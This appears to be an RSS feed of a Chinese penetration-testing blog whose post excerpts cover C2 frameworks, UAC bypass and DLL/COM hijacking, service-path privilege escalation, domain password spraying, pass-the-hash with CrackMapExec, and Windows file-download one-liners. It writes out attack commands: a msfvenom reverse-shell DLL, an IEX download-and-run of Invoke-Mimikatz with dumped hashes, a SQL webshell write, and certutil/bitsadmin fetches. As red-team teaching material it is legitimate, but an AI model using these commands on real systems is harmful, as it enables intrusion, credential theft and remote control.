<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内网渗透 on 倾旋的博客</title><link>https://payloads.online/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link><description>Recent content in 内网渗透 on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Sat, 30 Mar 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml"/><item><title>OWASP - 吉林沙龙《后渗透与邮件安全》 议题解读</title><link>https://payloads.online/archivers/2019-03-30/2/</link><pubDate>Sat, 30 Mar 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-03-30/2/</guid><description>在线地址：https://www.bilibili.com/video/av51712186/
0x00 前言 本文的研究与收获，话费了我近一个季度的时间去掌握，写下这篇文章的意义就在于给自己一个总结，另外，由衷感谢我的前辈给予我的指导，一言一行影响着我。
“如果某天你也有这种打算了，可能那个时候我也不一定在了，无论在不在，告诉我，我不问，你不说，我不拦，但是我想送你” - Micropoor
0x01 后渗透的定义 这个是一个宽泛的概念，我认为后渗透的定义就是：
1 2 [root@localhost ~]# ./pentest ==&amp;gt; “在拥有目标一定权限后的持续渗透行为。” 0x02 C2(Command and Control)简介 C2，其含义在安全领域中意思是命令与控制，具体的技术表现为远控木马。 是一种通常用于持续控制一个或多个目标的技术手段，这个技术手段覆盖了多种网络通信（计算机交互、通信）的方式。
这个“多种”指的是有很多种方式，基于HTTP、SMTP、HTTPS、纯数据报文、&amp;hellip;.
0x03 C2的原理 命令与控制的原理就是目标机器主动或被动的与控制端进行交互，不断获取指令执行。
交互：可能不是一个直接的网络连接
命令与控制在行为上一般需要与许多操作系统接口进行交互，例如：网络通信、文件读写、进程管理等。
0x04 后渗透平台 – Cobalt Strike Cobalt Strike是一个跨平台、多人协作式、红队评估后渗透平台。 它支持多人通信、权限维持、文件操作、提权、横向渗透……等多种功能，使用者只需要部署好teamserver就可以在任意平台上连接teamserver进行渗透。
https://www.cobaltstrike.com/
0x05 后渗透平台 – Metasploit Framework Metasploit Framework是一个跨平台、开源、较为开放式的安全评估平台。 它支持权限维持、文件操作、提权、横向渗透、载荷生成……等多种功能，使得渗透更加灵活。
https://www.metasploit.com/
0x06 后渗透的需求 通过一些常用的平台、工具总结，我得出一些以下几个基本需求：
这些需求就必定要形成一个跨平台支持、兼容性最好、拓展性强的框架，而大部分框架的基础模式就是如下所说。
框架基本组成 PAYLOAD 模块 漏洞 0x07 PAYLOAD进入目标机器内存的方式 在常规的渗透过程里，为了获得一定的权限，基本上绝大部分的动机都是在目标机器上的内存种执行指令，它的表现形式大部分都是一个后门、加载器等。
而进入的方式就如下：
文件上传木马执行 – 落地 Powershell -&amp;gt; IEX DLL注入 -&amp;gt; regsvr32、rundll32 .NET技术 -&amp;gt; .</description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>首先这是DLL项目，找到调试选项：
调用rundll32 来调试：
这样就可以进行调试了。</description></item><item><title>Windows 2019 Bypass (UAC、Defender) to Metasploit</title><link>https://payloads.online/archivers/2019-01-26/1/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/1/</guid><description>0x00 前言 昨天下午在小密圈看到一篇文章：https://egre55.github.io/system-properties-uac-bypass/
文中指出 SystemPropertiesAdvanced.exe 有DLL劫持漏洞，经过分析，在Windows 10下无法复现
之前也做过关于DLL劫持、Bypass UAC的议题：DLL Hijacking &amp;amp; COM Hijacking ByPass UAC - 议题解读
在向下阅读前，请先掌握DLL劫持和Bypass UAC的基本知识。
微信交流群，加我微信：Guest_Killer_0nlis。
0x01 Cooolis Cooolis是我写的一个支持MSF与Cobaltstrike上线的加载器，能够100%绕过绝大部分杀软，包含国内90%以上、Windows Defender等。
之前发出了演示视频，在这里可以看到：Cobalt Strike - Metasploit Bypass AV
然后这个操作系统缺陷由于拥有自动权限提升的权限 autoElevate属性，我们可以利用它来执行Cooolis，使得Coolis上线的会话同样拥有管理员权限。
关于Bypass UAC的挖掘方法与原理，我的议题已经转化成了视频：
0x02 效果演示 Windows 2019中的C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe在运行时，会寻找srrstr.dll，这个DLL文件并不存在于：
C:\Windows\SysWOW64\srrstr.dll C:\Windows\System\srrstr.dll C:\Windows\srrstr.dll C:\Windows\SysWOW64\wbem\srrstr.dll C:\Windows\SysWOW64\WindowsPowershell\v1.0\srrstr.dll C:\Users&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\srrstr.dll 在最后它会寻找C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\这个目录，而这个目录的读写是不需要触发UAC获得管理员权限来操作的。
由此，可以利用该缺陷，将Coolis转换成DLL，上传至C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\，紧接着执行SystemPropertiesAdvanced.exe，它会自动将srrstr.dll加载至SystemPropertiesAdvanced.exe进程的内存，同样的，我们也就拥有了管理员权限。
在此之前，我有想过在下列模块里做一些优化：
exploit/windows/local/bypassuac_fodhelper exploit/windows/local/bypassuac_injection exploit/windows/local/bypassuac_comhijack 我觉得COM劫持的空间还是很大的，并且也一定程度上能够bypass AV。
Demo：
0x03 总结 UAC、DLL劫持、COM劫持的问题肯定还会有很多、但是以前的轮子到现在拿起来用基本上都会被行为拦截，这就需要掌握原理去自己探索、创造。
系统镜像：ed2k://|file|cn_windows_server_2019_x64_dvd_4de40f33.iso|5086887936|7DCDDD6B0C60A0D019B6A93D8F2B6D31|/</description></item><item><title>DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</title><link>https://payloads.online/archivers/2018-12-22/1/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-22/1/</guid><description>在线地址：https://www.bilibili.com/video/av51718274/
0x00 前言 本文章只是方便阅读PPT，对于深入的去理解没有太大帮助，只是做个知识索引。
目录如下：
何为劫持 DLL是什么 DLL加载的过程 DLL劫持的原理 实现一个DLL劫持 - DLL Main 什么是COM 应用程序与COM注册表的关系 COM组件加载的过程 COM组件劫持的原理 实现一个COM组件劫持 UAC简介 ByPASS UAC的几种方式 ByPASS UAC原理 ByPASS UAC演示 挖掘ByPASS UAC的方法 PPT共享在文末的小密圈中了
0x01 何为劫持 即：“在正常事物发生之前进行一个旁路操作”
0x02 DLL是什么 DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。
在Windows平台下，我们使用的应用程序中的功能其实大多都很相似，窗口调用窗口的模块，分配内存调用内存管理的模块，文件操作调用IO模块，这些模块在Windows里的具体表现就是DLL文件。
0X03 DLL的加载过程 1.程序所在目录 2.程序加载目录（SetCurrentDirectory） 3.系统目录即 SYSTEM32 目录 4.16位系统目录即 SYSTEM 目录 5.Windows目录 6.PATH环境变量中列出的目录 PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。
注册表路径：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
DLL的加载过程 – Know DLLs注册表项 Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。
DLL的加载过程 – Process Monitor Process Monitor是Windows的高级监视工具，可显示实时文件系统，注册表和进程/线程活动。
它结合了两个传统Sysinternals实用程序Filemon和Regmon的功能，并添加了大量增强功能，包括丰富和非破坏性过滤，全面的事件属性，如会话ID和用户名，可靠的流程信息，带有集成符号支持的完整线程堆栈 对于每个操作，同时记录到文件等等。 其独特的强大功能将使Process Monitor成为系统故障排除和恶意软件搜索工具包的核心实用程序。</description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p>在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p>
&lt;ul>
&lt;li>Pass The Hash&lt;/li>
&lt;li>Silver Tickets、Golden Tickets、&lt;/li>
&lt;li>Impersonation Token&lt;/li>
&lt;/ul>
&lt;p>这些技术分别能够满足我们在渗透中持续的维持权限、提权。&lt;/p>
&lt;p>作者：倾旋&lt;/p></description></item><item><title>内网渗透心得</title><link>https://payloads.online/archivers/2018-11-26/1/</link><pubDate>Mon, 26 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-26/1/</guid><description>0x00 什么是内网渗透 通常是拿下某个内网访问权限后在内网中渗透？
0x01 为什么会出现内网渗透这个技术名词？ 因为在企业的网络建设里，有些数据资源需要保护起来，于是选择放在内网，这是一点，还有一点跟互联网地址空间、资金有关，于是NAT地址转换、端口转发技术应用的越来越多，形成了一个网关、N台服务器的形式，当某个对外服务被黑客入侵，那么黑客还会使用这个缺口继续深入，但是内网中的网络管理安全强度并没有外网那么严谨，导致Wannacry、震网等病毒统治内网，还有就是内网的服务、服务器大多采用默认配置，这并不是一个非常安全的方案，可并未重视起来。
0x02 为什么谈到内网渗透技术，Linux相关的较少？ 其实这个和windows的认证有关系，例如Pass The Hash、伪造票据、令牌假冒等，但是linux的认证较为单一，均采用ssh管理，并使用非对称加密。但是Windows从work group到domain，使用lm、ntlm、kerberos，不断向后兼容的过程中，之前的协议缺陷越来越多，系统补丁都更新的很频繁。你要说它不好，其实要是做好加固，完全是可以不需要内外网之分的，无非就是地址的多少、资金问题。kerberos认证协议的问世，解决了在不安全的网络中进行双向认证、且不怕中间人攻击。域，对应一个域名，一个域名一个组织\企业，这都完全是可行的。总归来说，其实内网渗透它本身不算一个技术类别，而是考验你在不同的网络环境下，对操作系统、网络基础的理解能力。内网渗透不是一个技术类别，渗透测试也不是“测试网站”、“挖掘Web漏洞”，那叫Web应用安全测试。为什么会变成这样呢？是因为HTTP普及的太快了，发展的也很迅速，之前还在玩着xss，这又迅速普及了websocket……于是大家都把“系统”当作网站，把网站当作“系统”。直面现实的话，这不是不好，正是因为这样，安全行业才能够使得更多的人关注安全、让新鲜血液注入。
0x03 内网渗透需要掌握哪些东西？ 内网渗透只是现代攻防的一种表现，市场要比Web应用安全测试要小的多。但是你必须去掌握它，因为当木马、病毒来临时，你举手无措、你基础薄弱、你不能很快的发现问题，无法溯源、不知道木马如何落地。所以，攻防要持续学习，不管外网多么艰难，从外部进入内部的可能有很多，只是web的可能性更大。你需要掌握计算机操作系统基础知识、掌握一门或两门编程语言，必须保证一种是跨平台的、网络基础（路由、交换）、非常扎实的TCP/IP协议基础、不断持续研究的心。
就目前来看，我发现从乙方的一些服务中能够直接转换到甲方技能的就是应急响应了，那么应急的时候，你难道还说：“我不需要懂内网渗透吗？？？？” - 倾旋 2018-11-23</description></item><item><title>COM Hijacking</title><link>https://payloads.online/archivers/2018-10-14/1/</link><pubDate>Sat, 13 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-14/1/</guid><description>0x00 COM介绍 COM是Component Object Model （组件对象模型）的缩写。
COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。
0x01 应用程序与COM注册表的关系 注册表 首先需要介绍一下注册表，注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。
名称 作用 HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性。 HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息。 HKEY_CURRENT_USER 用于存储当前用户配置项。 HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项。 HKEY_LOCAL_MACHINE 用于存储当前用户物理状态。 HKEY_USERS 用于存储新用户的默认配置项。 HKEY_CLASSES_ROOT = HKEY_LOCAL_MACHINE + HKEY_CURRENT_USER
CLSID 首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。
CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。
也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。
按下Ctrl+R打开运行窗口，键入 ::{20D04FE0-3AEA-1069-A2D8-08002B30309D}即可打开“我的电脑”
回收站的CLISD是：::{645FF040-5081-101B-9F08-00AA002F954E}
CLSID是如何创建的 CLSID结构体：
1 2 3 4 5 6 7 8 typedef struct _GUID { DWORD Data1; // 随机数 WORD Data2; // 和时间相关 WORD Data3; // 和时间相关 BYTE Data4[8]; // 和网卡MAC相关 } GUID; typedef GUID CLSID; // 组件ID typedef GUID IID; // 接口ID 通过操作系统提供的结构体与API来创建CLSID，保障唯一性。</description></item><item><title>Windows 本地特权提升技巧</title><link>https://payloads.online/archivers/2018-10-08/1/</link><pubDate>Mon, 08 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-08/1/</guid><description>0x00 前言 本文主要有以下章节：
1.服务路径权限可控提权 2.模糊路径提权 3.定时任务计划提权 4.MSI安装策略提权 5.DLL劫持提权 6.信息搜集 许多事只有做了才知道。 - Rvn0xsy（倾旋）
写于 2018/9/17
0x01 服务路径权限可控 通常情况下，一些Web控件、网络客户端会在本地注册一些服务，这些服务在开机自启动，而自启动的权限又是SYSTEM。
在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
我选择一个名为“gwservice”的项，查看该项下的所有值：
其中有一个ImagePath的名称，它的值是：
C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe
可见它是一个VPN相关的服务，下面有两种提权可能：
1.若这个注册表的修改权限当前用户可控，那就可以直接修改ImagePath的值，指向到本地其他路径，获得这个服务的权限。 2.若这个ImagePath所指向的目录权限可控，那么我们也可以替换gwservice.exe，从而当服务启动的时候，就能够执行我们的应用程序（木马）。 但是很遗憾，第1种不行：
当前用户没有足够的权限。
尝试第二种方法，使用“icacls”命令查看目录权限：
惊喜的发现，“Everyone”用户可以读写该目录下所有文件。
Ps:Everyone代指当前主机下所有用户，包含（Guest）
提权过程 首先，我启用了win7的Guest用户，使用Guest用户登录这台机器：
Ping命令都不让用，限制很死。
使用msf生成一个木马：
将木马替换为gwservice.exe
先执行测试一下，能否获得Guest的session：
获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：
提权情况还是要根据服务器本身的环境，我总结的这些方法就是为了优先采用这些方式，而不是直接突突搞EXP ……
0x02 模糊路径提权 在上一篇中，我们继续基于Gateway Session Service这个服务进行分析其他提权方法：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
其中有一个ImagePath的名称，它的值是：
C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe
当服务启动时，将会读取这个ImagePath的值，我们无法更改这个值，但是可以通过Windows的特性来巧妙提权。 注意：当前这个环境只是演示，排除目录权限的原因是100%成功的。
重点：当ImagePath的值不是一个绝对路径时，我们可以通过Windows API中的“CreateProcessA”函数的特性，将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。
例子：
C:\Program Files (x86)\server process\ssl\service.exe
如果不是绝对路径，寻找过程如下：
C:\Program.exe C:\Program Files (x86)\server.exe C:\Program Files (x86)\server process\ssl\service.exe 参考链接： https://docs.</description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>0x00 DLL劫持简介 《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。 &amp;ndash; 百度百科
0x01 应用程序寻找DLL的过程 1.程序所在目录 2.系统目录即 SYSTEM32 目录 3.16位系统目录即 SYSTEM 目录 4.Windows目录 5.加载 DLL 时所在的当前目录 6.PATH环境变量中列出的目录 首先如果在程序所在目录下未寻找到DLL，一般会在SYSTEM32目录下寻找到，那么可能会存在DLL劫持，要看注册表
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。
0x02 寻找过程 Process Monitor一款系统进程监视软件，总体来说，Process Monitor相当于Filemon+Regmon，其中的Filemon专门用来监视系统 中的任何文件操作过程，而Regmon用来监视注册表的读写操作过程。 有了Process Monitor，使用者就可以对系统中的任何文件和 注册表操作同时进行监视和记录，通过注册表和文件读写的变化， 对于帮助诊断系统故障或是发现恶意软件、病毒或木马来说，非常 有用。 这是一个高级的 Windows 系统和应用程序监视工具，由优秀的 Sysinternals 开发，并且目前已并入微软旗下，可靠性自不用说。
通过Process Monitor找出一些可能容易被劫持的DLL，特征一般如下：
ntmarta.dll(直接调用) profapi.dll（需要点击“配置”） 这两个都不在KnownDLLs中，由于开发人员调用这两个DLL的时候没有定义绝对路径，导致DLL搜索，我们可以直接在搜索到system32之前，放入我们要劫持的DLL。
权限问题：
如果要劫持的DLL目录被操作系统限制了必须以管理员权限才可以读写，那么我们无法利用，本文演示从低权限到高权限的DLL劫持提权。
那么这个漏洞刚刚好也符合我们的案例：C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400
这个目录是任何人都可以读写的，使用MSF生成DLL：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.19 LPORT=4478 -f dll &amp;gt; ntmarta.dll
接下来通过任意途径，将dll copy到C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400路径下即可
MSF配置如下：
当用户使用输入法的时候、或者重启PC的时候，或者切换输入法的时候，都将会触发，我们可以获得一个Meterpreter会话。
0x03 视频演示</description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>0x00 前言 在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？
0x01 Powershell 目前已经有很多Powershell集合脚本，用于域渗透简直舒爽
今天推荐一款名字叫DomainPasswordSpray.ps1的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。
GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray
由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。
优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt
0x02 参数说明 在代码的开头就已经有介绍了，我简单汉化一下。
描述：该模块主要用于从域中收集用户列表。
参数： Domain 指定要测试的域名 参数： RemoveDisabled 尝试从用户列表删除禁用的账户 参数： RemovePotentialLockouts 删除锁定账户 参数： UserList 自定义用户列表(字典)。 如果未指定，这将自动从域中获取 参数： Password 指定单个密码进行口令测试 参数： PasswordList 指定一个密码字典 参数： OutFile 将结果保存到某个文件 参数： Force 当枚举出第一个后继续枚举，不询问 0x03 使用说明 使用例子：
C:\PS&amp;gt; Get-DomainUserList
该命令将从域中收集用户列表。
C:\PS&amp;gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中
C:\PS&amp;gt; Invoke-DomainPasswordSpray -Password Winter2016
该命令将会从域环境中获取用户名，然后逐个以密码Winter2016进行认证枚举
C:\PS&amp;gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.</description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>0x01 前言 早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。
从Win2000开始默认协议为Kerboros，下列情况会调用NTLM：
遗留客户端或服务器需要登录到网络或本地时。 UNIX客户端需要与NT服务器通话时。 有正在使用验证NTLM的服务器信息块（SMB）后台程序的UNIX客户端时。 也即认证方或被认证方有仅支持NTLM情况时。 它以挑战/响应（Challenge/Response）顺序为基础。
1.客户端发送用户名和域名到服务器。 2.服务器转发到域控制器DC。 3.DC用客户端密码随机产生一个8字节得挑战（Challenge），发送给服务器。 4.服务器将挑战转发给客户端。 5.客户端用密码经过hash及DES加密算法等操作得到一个加密结果响应（Response）发送给服务器。 6.服务器将响应转发给DC。 7.DC做同样操作验证客户端响应。 8.验证结束，返回结果通知服务器。 0x02 NTLM对渗透的作用 NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。
最大的特点就是我们可以使用SMB执行Command。
0x03 CrackMapExec 介绍 CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。
WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki
0x03 安装CrackMapExec Kali Linux apt-get install crackmapexec
Debian/Ubuntu 1 2 apt-get install -y libssl-dev libffi-dev python-dev build-essential pip install crackmapexec 0x04 传递NTLM Hash执行命令 使用Mimikatz获取NTLM Hash 1 2 3 4 PS C:\Users\administrator\Documents&amp;gt;IEX(New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;) PS C:\Users\administrator\Documents&amp;gt;Invoke-Mimikatz 获取NTLM Hash
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 **** msv : [00000003] Primary * Username : Administrator * Domain : PAYLOADS * LM : 5609e3f4c7c56d5fa86fb73c70515bd7 * NTLM : dab7de8feeb5ecac65faf9fdc6cac3a9 * SHA1 : 67302089bba4993f2f845e5992db0a21e64679fa tspkg : * Username : Administrator * Domain : PAYLOADS * Password : **** wdigest : * Username : Administrator * Domain : PAYLOADS * Password : **** kerberos : * Username : Administrator * Domain : PAYLOADS.</description></item><item><title>针对某跨国企业的一次渗透测试-持续</title><link>https://payloads.online/archivers/2018-01-30/1/</link><pubDate>Tue, 30 Jan 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-01-30/1/</guid><description>&lt;p>文章涉及泄漏厂商隐私，已经删除！&lt;/p></description></item><item><title>针对国内一大厂的后渗透 - 持续</title><link>https://payloads.online/archivers/2017-12-28/1/</link><pubDate>Thu, 28 Dec 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-12-28/1/</guid><description>0x00 前言 此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。
0x01 信息搜集 - 后渗透 首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell
这里我挑选了一个某厂边缘处的一个测试环境，在这之前我做了大量的信息搜集，没有选择直接去挖掘、利用漏洞
操作系统 Web服务器版本 PHP版本 绝对路径 子域名 开放端口 - 发现开启了防火墙 扫描到它存在phpMyadmin，弱口令登录进入，通过常规手法SQL写入shell。
1 SELECT &amp;#39;&amp;lt;?php @assert($_POST[&amp;#34;qyxmsq56dhaye3&amp;#34;]);?&amp;gt;&amp;#39; INTO OUTFILE &amp;#39;D:/WWW/***/master/&amp;#39;; 通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。
1 2 3 4 5 6 D:\WWW\***\master\&amp;gt; net user /domain 这项请求将在域 WORKGROUP 的域控制器处理。 发生系统错误 1355。 指定的域不存在，或无法联系。 通过上面的结果可以看到该服务器并不是域成员
1 2 D:\WWW\***\master\&amp;gt; query user * 没有用户 没有管理员在线
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 D:\WWW\***\master\&amp;gt; netstat -ano 活动连接 协议 本地地址 外部地址 状态 PID TCP 0.</description></item><item><title>socat 使用手册</title><link>https://payloads.online/tools/socat/</link><pubDate>Thu, 09 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/tools/socat/</guid><description>socat简介 socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版，socat的官方网站：http://www.dest-unreach.org/socat/ 。
Socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、socket（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。
Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。
socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。
socat的安装 网络安装： Debian/Ubuntu:apt-get install socat
Mac OSX:brew install socat
ps:Kali linux 里已经集成了此工具
下载软件包 下载socat源代码包：http://www.dest-unreach.org/socat/download/
编译安装 把下载的软件包解压后按照传统的方式编译安装：
1 2 3 ./configure make make install 具体的细节可以参考安装文档 README 。
安装错误解决 在编译的过程中可能遇到如下错误：
解决方法有两种：
第一种是禁用fips，使用如下命令配置： ./configure --disable-fips
第二种是安装fips 首先到网站http://www.openssl.org/source/ 下载openssl-fips安装包，然后解压安装：
1 2 3 ./config make make install socat的使用 socat的具体文档参见网站：http://www.dest-unreach.org/socat/doc/socat.html 。
工作机理 socat的运行有4个阶段:
初始化 解析命令行以及初始化日志系统。
打开连接 先打开第一个连接，再打开第二个连接。这个单步执行的。 如果第一个连接失败，则会直接退出。</description></item><item><title>Windows下命令行下载文件总结</title><link>https://payloads.online/archivers/2017-11-08/1/</link><pubDate>Wed, 08 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-08/1/</guid><description>0x00 Powershell win2003、winXP不支持
$client = new-object System.Net.WebClient
$client.DownloadFile(&amp;lsquo;http://payloads.online/file.tar.gz', &amp;lsquo;E:\file.tar.gz&amp;rsquo;)
0x01 ftp ftp 192.168.3.2
输入用户名和密码后
lcd E:\file # 进入E盘下的file目录
cd www # 进入服务器上的www目录
get access.log # 将服务器上的access.log下载到E:\file
可以参考：https://baike.baidu.com/item/ftp/13839
0x02 IPC$ copy \192.168.3.1\c$\test.exe E:\file
可以参考：http://www.163164.com/jiqiao/163164com011.htm
0x03 Certutil 可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx
应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt
0x04 bitsadmin 可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx
1、bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt 2、bitsadmin /rawreturn /transfer getpayload http://192.</description></item></channel></rss>